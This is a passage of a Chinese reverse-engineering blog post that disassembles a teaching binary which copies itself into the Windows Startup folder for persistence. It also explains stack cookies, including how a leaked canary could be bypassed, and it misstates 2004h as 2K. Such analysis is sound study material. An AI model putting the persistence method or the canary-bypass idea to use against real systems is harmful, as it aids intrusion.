ds:SHGetFolderPathW</span><br><span class="line">.text:00401040                 push    offset String2  ; &quot;\\wsample01b.exe&quot;</span><br><span class="line">.text:00401045                 lea     edx, [ebp+pszPath]</span><br><span class="line">.text:0040104B                 push    edx             ; lpString1</span><br><span class="line">.text:0040104C                 call    ds:lstrcatW</span><br><span class="line">.text:00401052                 push    0               ; bFailIfExists</span><br><span class="line">.text:00401054                 lea     eax, [ebp+pszPath]</span><br><span class="line">.text:0040105A                 push    eax             ; lpNewFileName</span><br><span class="line">.text:0040105B                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:00401061                 push    ecx             ; lpExistingFileName</span><br><span class="line">.text:00401062                 call    ds:CopyFileW</span><br><span class="line">.text:00401068                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:0040106B                 xor     ecx, ebp        ; StackCookie</span><br><span class="line">.text:0040106D                 xor     eax, eax</span><br><span class="line">.text:0040106F                 call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401074                 mov     esp, ebp</span><br><span class="line">.text:00401076                 pop     ebp</span><br><span class="line">.text:00401077                 retn</span><br><span class="line">.text:00401077 sub_401000      endp</span><br></pre></td></tr></table></figure>
<p>这个函数都干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br></pre></td></tr></table></figure>
<p>winmain函数开端,压栈保存调用者的ebp帧指针,ebp用于winmain函数的帧指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401003                 mov     eax, 2004h</span><br><span class="line">.text:00401008                 call    __alloca_probe</span><br></pre></td></tr></table></figure>
<p>这里调用了一个<code>__alloca_probe</code>函数,上一行往eax寄存器中存放的2004h是函数参数</p>
<p>这个函数干了啥呢?</p>
<h4 id="call-__alloca_probe"><code>call    __alloca_probe</code></h4>
<p>理论上函数开端在保存帧指针ebp之后接着就应该esp-xxx,为当前函数开辟栈帧,而在sub_401000中并没有这样的指令,或者说本应该开辟栈空间的指令的地方有一个<code>call    __alloca_probe</code>那么这个函数调用是否就起到了开辟栈空间的作用呢?</p>
<blockquote>
<p><code>__alloca_probe</code></p>
<p>从名字上看,该函数有两部分,一个是allocate,分配,另一个是probe,探针,探针?这个函数上网搜吧,就是找不到一个详细解释</p>
<p>在binary
book上,该函数是<code>wsample0._chkstk</code>这个函数就有解释了</p>
<blockquote>
<p>MSDN:</p>
<p>_chkstk Routine</p>
<p>Called by the compiler when you have more than one page of local
variables in your function.</p>
<p>_chkstk Routine is a helper routine for the C compiler. For x86
compilers, _chkstk Routine is called when the local variables exceed 4K
bytes; for x64 compilers it is 8K.</p>
<p>_chkstk例程:</p>
<p>当函数栈帧大小大于一个内存页时,编译器会调用该函数</p>
<p>该例程是C编译器的补充.对于x86编译器,当局部变量超过4K时调用,对于x64编译器,局部变量超过8k时调用</p>
<p>然而MSDN只是介绍了啥时候调用这个函数,并没有介绍为啥调用,和调用该函数的影响</p>
<p>下面参考了stackoverflow</p>
<blockquote>
<p>Windows pages in extra stack for your thread as it is used. At the
end of the stack, there is one guard page mapped as inaccessible memory
-- if the program accesses it (because it is trying to use more stack
than is currently mapped), there's an access violation. The OS catches
the fault, maps in another page of stack at the same address as the old
guard page, creates a new guard page just beyond the old one, and
resumes from the instruction that caused the violation.</p>
<p>为线程添加额外的windows页.在栈底有一个被操作系统监管的被映射为不可访问内存的页.如果程序视图访问该页(栈空间太小了)就会发生访问冲突.操作系统会捕获该错误,映射到与旧保护页位于同一地址的另一个堆栈页中，在旧保护页之后创建一个新的保护页，然后从导致冲突的指令恢复。</p>
<p>If a function has more than one page of local variables, then the
first address it accesses might be more than one page beyond the current
end of the stack. Hence it would miss the guard page and trigger an
access violation that the OS doesn't realise is because more stack is
needed. If the total stack required is particularly huge, it could
perhaps even reach beyond the guard page, beyond the end of the virtual
address space assigned to stack, and into memory that's actually in use
for something else.</p>
<p>如果一个函数有多个本地变量页，那么它访问的第一个地址可能是堆栈当前端之外的多个页面。因此它会错过保护页面并触发一个操作系统没有意识到的访问冲突，因为需要更多的堆栈。如果所需的总堆栈特别巨大，它甚至可能超出保护页面，超出分配给堆栈的虚拟地址空间的末尾，进入实际用于其他用途的内存。</p>
<p>So, <code>_chkstk</code> ensures that there is enough space for the
local variables. You can imagine that it does this by touching the
memory for the local variables at page-sized intervals, in increasing
order, to ensure that it doesn't miss the guard page (so-called "stack
probes"). I don't know whether it actually does that, though, possibly
it takes a more direct route and instructs the OS to map in a certain
amount of stack. Either way, if the total required is greater than the
virtual address space available for stack, then the OS can complain
about it instead of doing something undefined.</p>
<p>因此，_ chkstk
确保局部变量有足够的空间。可以想象，它通过按页面大小的间隔访问本地变量的内存来实现这一点，以递增的顺序，确保它不会错过保护页(所谓的“堆栈探测”)。我不知道它是否真的这样做，但是，可能它采取了一个更直接的例程，并指示操作系统映射到一定数量的堆栈。无论哪种方式，如果所需的总空间大于可用于堆栈的虚拟地址空间，那么操作系统可以报告这件事，而不是执行未定义的操作。</p>
</blockquote>
</blockquote>
<p>逆向__alloca_probe函数观察其行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:004018E0 __alloca_probe  proc near               ; CODE XREF: sub_401000+8↑p</span><br><span class="line">.text:004018E0                 push    ecx		;压栈保存ecx</span><br><span class="line">.text:004018E1                 lea     ecx, [esp+4]	;ecx指向当前栈顶+4位置</span><br><span class="line">.text:004018E5                 sub     ecx, eax		;ecx-eax-&gt;ecx,显然ecx是一个内存地址,比eax要大,这里不会置CF</span><br><span class="line">.text:004018E7                 sbb     eax, eax		;eax-eax-CF-&gt;eax,由于上一步不需要置CF,因此这里eax=0</span><br><span class="line">.text:004018E9                 not     eax			;eax=反eax,即eax这个32位寄存器全置高</span><br><span class="line">.text:004018EB                 and     ecx, eax		;ecx和全1按位与还是ecx</span><br><span class="line">.text:004018ED                 mov     eax, esp		;esp-&gt;eax,eax获得栈顶指针快照</span><br><span class="line">.text:004018EF                 and     eax, 0FFFFF000h	;eax只保留高20位,低12位置0</span><br><span class="line">.text:004018F4</span><br><span class="line">.text:004018F4 cs10:                                   ; CODE XREF: __alloca_probe+29↓j</span><br><span class="line">.text:004018F4                 cmp     ecx, eax			;ecx-eax根据结果置flag</span><br><span class="line">.text:004018F6                 jb      short cs20		;如果ecx&lt;eax则跳转cs20</span><br><span class="line">.text:004018F8                 mov     eax, ecx			;如果ecx&gt;=eax,则eax=ecx</span><br><span class="line">.text:004018FA                 pop     ecx				;尾声,栈顶还给ecx</span><br><span class="line">.text:004018FB                 xchg    eax, esp			;eax和esp交换</span><br><span class="line">.text:004018FC                 mov     eax, [eax]		;</span><br><span class="line">.text:004018FE                 mov     [esp+0], eax</span><br><span class="line">.text:00401901                 retn						;唯一的函数出口</span><br><span class="line">.text:00401902 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401902</span><br><span class="line">.text:00401902 cs20:                                   ; CODE XREF: __alloca_probe+16↑j</span><br><span class="line">;执行到此说明.text:004018F6 处有ecx&lt;eax,于是循环执行下面三行,直到ecx&gt;=eax</span><br><span class="line">.text:00401902                 sub     eax, 1000h		;eax-1000h-&gt;eax	,1000h就是4KB,32位win上一个页框的大小											;栈顶下移4K,eax待会要赋值给esp栈顶指针</span><br><span class="line">.text:00401907                 test    [eax], eax		;蜜汁操作,test运算了一下结果下一行是无条件跳转,运算个寂寞?</span><br><span class="line">.text:00401909                 jmp     short cs10</span><br><span class="line">.text:00401909 __alloca_probe  endp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>该函数用到了很多寄存器,<code>ecx,eax,esp</code>,纯静态分析很容易分析中忘记寄存器中存放的是什么了,这时候可以使用动态调试按步就班地观察</p>
</blockquote>
<p><code>eax</code>在<code>sub_401000</code>中被赋值<code>2004h=8196d=2K</code>然后作为参数传递给<code>__alloca_probe</code>显然这个大小大于一个页框</p>
<p>如果分配大小eax小于一个页框大小4k,则程序相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;size in eax</span><br><span class="line">.text:004018E0                 push    ecx		</span><br><span class="line">.text:004018E1                 lea     ecx, [esp+4]	;ecx=esp+4</span><br><span class="line">.text:004018E5                 sub     ecx, eax		;ecx=esp+4-size</span><br><span class="line">.text:004018F8                 mov     eax, ecx		;eax=ecx=esp+4-size</span><br><span class="line">.text:004018FA                 pop     ecx			</span><br><span class="line">.text:004018FB                 xchg    eax, esp		;esp=eax=esp+4-size while eax=esp</span><br><span class="line">.text:004018FC                 mov     eax, [eax]	;eax指向老栈顶的元素</span><br><span class="line">.text:004018FE                 mov     [esp+0], eax	;老栈顶元素搬运到新栈顶位置</span><br><span class="line">.text:00401901                 retn	</span><br></pre></td></tr></table></figure>
<p>实际上就是把当前栈扩大size,然后将原来栈顶上存放的内容搬到新的栈顶上</p>
<p>当分配大小eax大于一个页框4K,则程序会有额外的循环步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401902 cs20:                                   ; CODE XREF: __alloca_probe+16↑j</span><br><span class="line">.text:00401902                 sub     eax, 1000h	;栈上开辟4k空间,eax待会要拷贝给esp</span><br><span class="line">.text:00401907                 test    [eax], eax	;触摸内存,触发缺页异常,让os将虚拟页载入物理页</span><br><span class="line">.text:00401909                 jmp     short cs10	;循环</span><br></pre></td></tr></table></figure>
<p>循环啥时候停止呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:004018F4 cs10:                                   ; CODE XREF: __alloca_probe+29↓j</span><br><span class="line">.text:004018F4                 cmp     ecx, eax			</span><br><span class="line">.text:004018F6                 jb      short cs20		</span><br></pre></td></tr></table></figure>
<p>ecx在最初的时候直接减去size,指向了希望的栈顶,这里就比较eax是否已经越过了希望的栈顶,</p>
<p>当eax首次越过(eax=ecx或者eax-ecx&lt;一个页框的大小4k)</p>
<p>此时栈空间足够大了,满足我们的希望了,可以停止循环了</p>
<p>在这里可以看出,x86windows的栈帧大小是<strong>以页框4K为单位进行分配</strong>的.</p>
</blockquote>
<h4
id="mov-eax-___security_cookie"><code>mov     eax, ___security_cookie</code></h4>
<p>这个<code>__security_cookie</code>带着下划线前缀,一看就不是用户写的,这是个啥呢?</p>
<p>从意义上看,安全cookie值,应该是和安全相关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:00403000 ; Segment permissions: Read/Write</span><br><span class="line">.data:00403000 _data           segment para public &#x27;DATA&#x27; use32</span><br><span class="line">.data:00403000                 assume cs:_data</span><br><span class="line">.data:00403000                 ;org 403000h</span><br><span class="line">.data:00403000 ; uintptr_t __security_cookie</span><br><span class="line">.data:00403000 ___security_cookie dd 0BB40E64Eh        ; DATA XREF: sub_401000+D↑r</span><br></pre></td></tr></table></figure>
<p><code>___security_cookie</code>位于.data段,程序拥有读写该段的权限.该段的段寄存器是<code>cs</code>寄存器</p>
<p><code>dword ___security_cookie=0BB40E64Eh</code>是一个双字类型,相当于一个int,32字节</p>
<p>这就是一个常数啊,为啥要把一个八竿子打不着的常数压栈呢?</p>
<p>在<code>sub_401000</code>尾声伊始,还有有一条涉及<code>security_cookie</code>指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0040106F                 call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br></pre></td></tr></table></figure>
<p>该条指令调用了一个函数<code>@__security_check_cookie@4</code></p>
<blockquote>
<p><code>@__security_check_cookie@4</code></p>
<p>从汇编符号上看,应该是fastcall调用约定</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220428155346372.png" /></p>
<p>本函数只需要一个参数,使用ecx寄存器传递</p>
<p>ecx寄存器传递了啥参数呢?在sub_40100中是这样写的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401068                 mov     ecx, [ebp+var_4]	</span><br><span class="line">.text:0040106B                 xor     ecx, ebp        ; StackCookie</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>var_4</code>又是啥?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0040100D                 mov     eax, ___security_cookie</span><br><span class="line">.text:00401012                 xor     eax, ebp</span><br><span class="line">.text:00401014                 mov     [ebp+var_4], eax</span><br></pre></td></tr></table></figure>
<p>cookie放到eax里面然后和ebp异或一下再放到var_4,即<code>var_4=___security_cookie ^ ebp</code>,相当于一层加密</p>
</blockquote>
<p>因此在尾声的时候把<code>var_4</code>拿出来还要和<code>ebp</code>异或一下才能得到<code>___security_cookie</code>,相当于一层解密</p>
<p>那么此时传递给<code>@__security_check_cookie@4</code>函数的ecx里面,<strong>理论上</strong>就应该是纯纯的<del>闸总</del><code>___security_cookie</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:004010A3 @__security_check_cookie@4 proc near    ; CODE XREF: sub_401000+6F↑p</span><br><span class="line">.text:004010A3                                         ; DATA XREF: __except_handler4+11↓o</span><br><span class="line">.text:004010A3                 cmp     ecx, ___security_cookie</span><br><span class="line">.text:004010A9                 jnz     short $failure$26820</span><br><span class="line">.text:004010AB                 rep retn</span><br></pre></td></tr></table></figure>
<p>该函数也确实将ecx和位于<code>.data</code>段的<code>___security_cookie</code>进行了比较,如果不一样则跳转<code>$failure$26820</code></p>
<p>上述过程干了个什么事呢?防止栈缓冲区溢出</p>
<p>下面是sub_401000函数的栈帧,var_4是在调用者ebp保存值s和本函数返回地址r之上的(var_4相对靠近栈顶,r在栈帧底部)</p>
<p>栈倒着长但是栈内数据正着长,如果有一个缓冲区一直增长,把位于<code>ebp-0x4</code>的var_4覆盖了,甚至把位于<code>ebp+0</code>的s等等也覆盖了</p>
<p>在函数尾声的时候,就会把var_4拿出来看看其中异或保存的<code>___security_cookie</code>是否发生了变化.</p>
<p>一旦检查出var_4中异或保存的<code>___security_cookie</code>发生了变化,则<strong>至少</strong>表明栈缓冲区溢出已经到了<code>ebp-0x4</code>,</p>
<p>至于后面的调用者ebp和本函数返回地址有没有被溢出呢?不知道,但是不能做出乐观的假设,</p>
<p>为了防止返回地址被修改引起的攻击,此时应当立刻终止进程并报告错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p><strong>为啥要把<code>___security_cookie</code>和ebp异或一下呢?</strong></p>
<p><strong>为啥不直接把<code>___security_cookie</code>副本压栈最后再将该副本退栈和位于<code>.data</code>的<code>___security_cookie</code>比较呢?</strong></p>
<p>这样相当于数据库保存了用户密码的明文,一旦脱库后果不堪设想.如果<code>___security_cookie</code>在栈上也是明文保存的,则可以利用printf格式化字符串漏洞尝试打印该值,在溢出的时候对于栈中<code>___security_cookie</code>副本位置,只需要装模做样的写上,后面继续溢出</p>
<p>这样就可以绕过检查</p>
<p><strong>为啥要和<code>ebp</code>异或一下呢?为啥不能是其他值?</strong></p>
<p>考虑这个与<code>___security_cookie</code>异或的值应该有什么特性?函数开端和函数尾声的时候都要与他异或,这个值应该保持不变,</p>
<p>满足这个特征的值可以想到的就是ebp了,对于当前函数,它永远指向栈帧底部不变.</p>
<p>栈顶指针就不行,esp会随着局部变量的声明或者子函数的调用而改变</p>
<p><strong>为啥使用异或运算加密呢?使用按位与,按位或不行吗?</strong></p>
<p>异或运算有一个性质:如果<span class="math inline">\(A\oplus
B=C\)</span>则<span class="math inline">\(C\oplus A=(A\oplus B)\oplus
A=B\)</span></p>
<p>显然按位与,按位或等运算没有这个性质</p>
<p>而这个性质正是在函数开端时<span class="math inline">\(var_4=ebp\oplus
security\_cookie\)</span>,</p>
<p>在函数尾声时能够<span
class="math inline">\(security\_cookie=var_4\oplus
ebp\)</span>的原理</p>
<p><strong>这样就绝对安全了吗?能够完全抵御栈缓冲区溢出修改函数返回地址了吗?</strong></p>
<p>使用security_cookie只能一定程度上保护调用者ebp和返回地址不被修改,栈帧中,存放在var_4之后,缓冲区之前的局部变量不受保护</p>
<p>并且<code>security_cookie</code>在编译之后就是一个定值了,运行时永远不变,使用ida就可以直接看到它多粗多长</p>
<p>在运行时动态调试一下就可以看到ebp是多少,</p>
<p>如果没有开启基址随机化,则每次ebp都是一个常数,</p>
<p>那么<code>var_4=security_cookie ^ ebp</code>也是一个常数,这就异或加密了个寂寞</p>
</blockquote>
<h4
id="call-dsgetmodulefilenamew"><code>call    ds:GetModuleFileNameW</code></h4>
<p>现在回到<code>sub_401000</code>函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    1000h           ; nSize</span><br><span class="line">lea     eax, [ebp+Filename]</span><br><span class="line">push    eax             ; lpFilename</span><br><span class="line">push    0               ; hModule</span><br><span class="line">call    ds:GetModuleFileNameW</span><br></pre></td></tr></table></figure>
<p>又调用了一个API函数GetModuleFileNameW,这个函数干了啥呢?</p>
<blockquote>
<p>GetModuleFileNameW函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetModuleFileNameW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HMODULE hModule,</span></span><br><span class="line"><span class="params">  [out]          LPWSTR  lpFilename,</span></span><br><span class="line"><span class="params">  [in]           DWORD   nSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>hModule:应用程序或者DLL实力句柄,如果为NULL则获取当前程序路径</p>
<p>lpFilename:获取路径之后存放之的字符串缓冲区</p>
<p>nSize:缓冲区大小,作用是防止缓冲区溢出</p>
</blockquote>
<p>在这里第一个参数hModule=0,表明要获取当前应用程序的目录</p>
<p>第二个参数lpFilename=Filename是sub_401000函数栈中的一个缓冲区</p>
<p>第三个参数nSize=1000h,表明缓冲区大小为4KB</p>
<blockquote>
<p>关于LPWSTR类型,实际是<code>wchar_t*</code>类型,即宽字符unicode编码的字符串</p>
<p>L长</p>
<p>P指针</p>
<p>W宽</p>
<p>STR字符串</p>
<p>宽字符的作用是支持包括英文,中文,日文等等各种花言鸟语的符号,ASCII码最多表示<span
class="math inline">\(2^8=256\)</span>个字符,unicode最多表示<span
class="math inline">\(2^{16}=65536\)</span>个字符,常用汉字就3000个,显然unicode有能力森罗万象</p>
</blockquote>
<h4
id="call-dsshgetfolderpathw"><code>call    ds:SHGetFolderPathW</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea     ecx, [ebp+pszPath]</span><br><span class="line">push    ecx             ; pszPath</span><br><span class="line">push    0               ; dwFlags</span><br><span class="line">push    0               ; hToken</span><br><span class="line">push    7               ; csidl</span><br><span class="line">push    0               ; hwnd</span><br><span class="line">call    ds:SHGetFolderPathW</span><br></pre></td></tr></table></figure>
<p>又是一个API函数</p>
<blockquote>
<p>它亲戚SHGetFolderPathA函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SHFOLDERAPI <span class="title function_">SHGetFolderPathA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HWND   hwnd,</span></span><br><span class="line"><span class="params">  [in]  <span class="type">int</span>    csidl,</span></span><br><span class="line"><span class="params">  [in]  HANDLE hToken,</span></span><br><span class="line"><span class="params">  [in]  DWORD  dwFlags,</span></span><br><span class="line"><span class="params">  [out] LPSTR  pszPath</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>其中参数<code>csidl=7</code>是啥意思呢?表示"启动"文件夹</p>
<blockquote>
<p>在win10上这个文件夹在<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></p>
</blockquote>
<p>获取<strong>"启动"文件夹</strong>目录,字符串存放到pszPath指向的缓冲区</p>
<blockquote>
<p>csidl其他值的意义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CSIDL_DESKTOP = &amp;H0 &#x27;// The Desktop - virtual folder</span><br><span class="line">CSIDL_PROGRAMS = 2 &#x27;// Program Files</span><br><span class="line">CSIDL_CONTROLS = 3 &#x27;// Control Panel - virtual folder</span><br><span class="line">CSIDL_PRINTERS = 4 &#x27;// Printers - virtual folder</span><br><span class="line">CSIDL_DOCUMENTS = 5 &#x27;// My Documents</span><br><span class="line">CSIDL_FAVORITES = 6 &#x27;// Favourites</span><br><span class="line">CSIDL_STARTUP = 7 &#x27;// Startup Folder</span><br><span class="line">CSIDL_RECENT = 8 &#x27;// Recent Documents</span><br><span class="line">CSIDL_SENDTO = 9 &#x27;// Send To Folder</span><br><span class="line">CSIDL_BITBUCKET = 10 &#x27;// Recycle Bin - virtual folder</span><br><span class="line">CSIDL_STARTMENU = 11 &#x27;// Start Menu</span><br><span class="line">CSIDL_DESKTOPFOLDER = 16 &#x27;// Desktop folder</span><br><span class="line">CSIDL_DRIVES = 17 &#x27;// My Computer - virtual folder</span><br><span class="line">CSIDL_NETWORK = 18 &#x27;// Network Neighbourhood - virtual folder</span><br><span class="line">CSIDL_NETHOOD = 19 &#x27;// NetHood Folder</span><br><span class="line">CSIDL_FONTS = 20 &#x27;// Fonts folder</span><br><span class="line">CSIDL_SHELLNEW = 21 &#x27;// ShellNew folder</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<h4 id="call-dslstrcatw"><code>call    ds:lstrcatW</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    offset String2  ; &quot;\\wsample01b.exe&quot;</span><br><span class="line">lea     edx, [ebp+pszPath]</span><br><span class="line">push    edx             ; lpString1</span><br><span class="line">call    ds:lstrcatW</span><br></pre></td></tr></table></figure>
<p>String2是.rdata段的常量字符串</p>
<p>pszPath存放了刚才调用函数SHGetFolderPathW获取的文件夹目录</p>
<p>这里相当于调用了<code>lstrcatw(&amp;pszPath,&amp;pszPath)</code>,将后者拼接到前者上,得到<code>wsample01b.exe</code>的绝对地址</p>
<p><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\wsample01b.exe</code></p>
<h4 id="call-dscopyfilew"><code>call    ds:CopyFileW</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    0               ; bFailIfExists</span><br><span class="line">lea     eax, [ebp+pszPath]</span><br><span class="line">push    eax             ; lpNewFileName</span><br><span class="line">lea     ecx, [ebp+Filename]</span><br><span class="line">push    ecx             ; lpExistingFileName</span><br><span class="line">call    ds:CopyFileW</span><br></pre></td></tr></table></figure>
<p>即调用了<code>CopyFileW(&amp;Filename,&amp;pszPath,0)</code></p>
<blockquote>
<p>CopyFileW函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CopyFileW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCWSTR lpExistingFileName,</span></span><br><span class="line"><span class="params">  [in] LPCWSTR lpNewFileName,</span></span><br><span class="line"><span class="params">  [in] BOOL    bFailIfExists</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>将一个已经存在的文件<code>lpExistingFileName</code>拷贝到一个新的位置<code>lpNewFileName</code></p>
<p>如果<code>bFailIfExists=1</code>并且新的位置已有同名文件,则函数执行失败,返回FALSE</p>
<p>如果<code>bFailIfExists=0</code>并且新的位置已有同名文件,则覆盖该文件</p>
</blockquote>
<p>综上程序干了一个将自己复制到"启动"文件夹下的工作,意图让自己每次开机自启,有了病毒的勤快但是没有病毒的毒性</p>
<h4 id="尾声">尾声</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">xor     ecx, ebp        ; StackCookie</span><br><span class="line">xor     eax, eax</span><br><span class="line">call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">mov     esp, ebp</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br><span class="line">sub_401000 endp</span><br></pre></td></tr></table></figure>
<p>首先检查金丝雀值是否被修改,这个前面已经分析过了</p>
<p>然后退还调用者的ebp,函数返回</p>
<h3 id="总结程序行为">总结程序行为</h3>
<p>首先调用sub_401000函数,该函数将<code>wsample01b.exe</code>拷贝到"启动"文件夹,然后弹窗打印"copied"</p>
<h2
id="ollydbg动态调试wsample01b.exe">ollydbg动态调试wsample01b.exe</h2>
<p>x32dbg和ollydbg就像那黑牛和白牛,就是那海尔兄弟</p>
<h3 id="打开">打开</h3>
<p>例程来自有趣的二进制<a
target="_blank" rel="noopener" href="https://github.com/kenjiaiko/binarybook">kenjiaiko/binarybook
(github.com)</a></p>
<p>用ollydbg打开<code>wsample01b.exe</code>,可以在ollydbg中的菜单栏中文件-&gt;打开,也可以快捷键F3打开</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161255625.png"
alt="image-20220707161255625" />
<figcaption aria-hidden="true">image-20220707161255625</figcaption>
</figure>
<p>还可以使用命令行参数打开<code>PS C:\Users\86135\Desktop\bin\binarybook\chap01\wsample01b\release&gt; od wsample01b.exe</code></p>
<blockquote>
<p>这里我把olly dbg.exe重命名为od方便使用</p>
<p>需要将od的根目录添加到环境变量path,才能使用终端调用od</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707160733203.png"
alt="image-20220707160733203" />
<figcaption aria-hidden="true">image-20220707160733203</figcaption>
</figure>
<p>在反汇编窗口第一行即<code>0x401000</code>位置已经自动有一个断点,</p>
<p>这个位置刚才我们已经经过ida静态分析过了,是sub_401000函数的起始地址,显然这个函数是根据地址起的哑名</p>
<p>这四个区的视图结构也是可以更改的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171515399.png"
alt="image-20220707171515399" />
<figcaption aria-hidden="true">image-20220707171515399</figcaption>
</figure>
<p>但是一般都使用默认的视图模式,这个看的习惯</p>
